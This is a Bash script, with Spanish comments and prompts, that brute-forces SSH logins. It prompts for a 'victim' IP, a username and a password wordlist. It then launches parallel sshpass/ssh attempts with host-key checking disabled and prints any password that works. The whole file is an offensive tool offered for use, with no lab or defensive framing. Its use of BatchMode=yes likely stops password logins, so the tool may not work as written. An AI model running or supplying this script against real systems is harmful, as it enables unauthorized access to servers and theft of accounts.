#!/bin/bash

# --- VALIDACIÓN DE REQUISITOS ----
if ! command -v sshpass &> /dev/null; then
    echo "[-] Error: 'sshpass' no está instalado. Instálalo con: sudo apt install sshpass"
    exit 1
fi

# --- INTERFAZ DE USUARIO ---
echo "=================================================="
echo "      SSH MULTI-THREAD BRUTEFORCER v2.0"
echo "=================================================="

read -p "[?] Introduce la IP de la víctima: " TARGET
read -p "[?] Usuario a atacar: " USER
read -p "[?] Ruta del diccionario (ej: /usr/share/wordlists/rockyou.txt): " PASS_LIST
read -p "[?] Número de hilos (recomendado 5-10): " MAX_THREADS

# Validar si el archivo existe
if [[ ! -f "$PASS_LIST" ]]; then
    echo "[-] Error: El archivo de diccionario no existe en esa ruta."
    exit 1
fi

echo -e "\n[*] Iniciando ataque contra $USER@$TARGET..."
echo "[*] Usando $MAX_THREADS hilos simultáneos."
echo "--------------------------------------------------"

# --- FUNCIÓN DE ATAQUE ---
probar_clave() {
    local p="$1"
    # El código \033[K limpia la línea actual de la terminal
    echo -ne " -> Intentando con: $p\033[K\r" 

    if sshpass -p "$p" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 -o BatchMode=yes "$USER@$TARGET" "whoami" &>/dev/null; then
        echo -e "\n\n[+] ¡ÉXITO ENCONTRADO!"
        echo "=========================================="
        echo "  USUARIO:  $USER"
        echo "  PASSWORD: $p"
        echo "=========================================="
        # Mata todo el grupo de procesos del script al encontrar la clave
        kill 0
    fi
}

export -f probar_clave
export USER TARGET

# --- BUCLE PRINCIPAL (GESTIÓN DE HILOS) ---
while read -r password; do
    # Semáforo: Controla que no superemos el máximo de procesos permitidos
    while [ $(jobs -rp | wc -l) -ge $MAX_THREADS ]; do
        sleep 0.05
    done

    # Lanzar el worker al fondo
    probar_clave "$password" &

done < "$PASS_LIST"

wait
echo -e "\n[!] Diccionario agotado sin éxito."
